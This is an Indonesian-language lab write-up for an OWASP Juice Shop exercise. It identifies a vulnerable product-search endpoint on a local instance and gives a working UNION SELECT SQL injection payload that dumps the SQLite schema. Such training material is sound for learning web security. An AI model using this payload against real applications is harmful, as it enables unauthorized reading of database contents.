# Injection - Soal 4 (Database Schema)

## 1. Soal
Ekstrak **database schema** dari aplikasi Juice Shop melalui SQL Injection.  
Targetnya adalah menemukan struktur tabel dan kolom yang ada di database.

---

## 2. Link Resource
- [OWASP Juice Shop](https://owasp-juice.shop)  
- [SQL Injection UNION attacks - PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks)  
- [SQLite Schema documentation](https://www.sqlite.org/schematab.html)  

---

## 3. Jawaban

### Step 1 – Identifikasi Endpoint Rentan
Pertama, dicoba fitur **pencarian produk** di Juice Shop.  
Endpoint yang digunakan adalah:
http://127.0.0.1:3000/rest/products/search?q=payload


Parameter `q` terbukti rentan terhadap SQL Injection.  



---

### Step 2 – Coba Payload UNION SELECT
Setelah dicoba beberapa kali untuk menyesuaikan jumlah kolom, payload final yang berhasil adalah:
```sql
test')) UNION SELECT 1,2,3,4,5,6,7,8,sql FROM sqlite_schema--
```
<img width="939" height="511" alt="image" src="https://github.com/user-attachments/assets/9d1f611f-9b40-47ae-903b-67c678440853" />
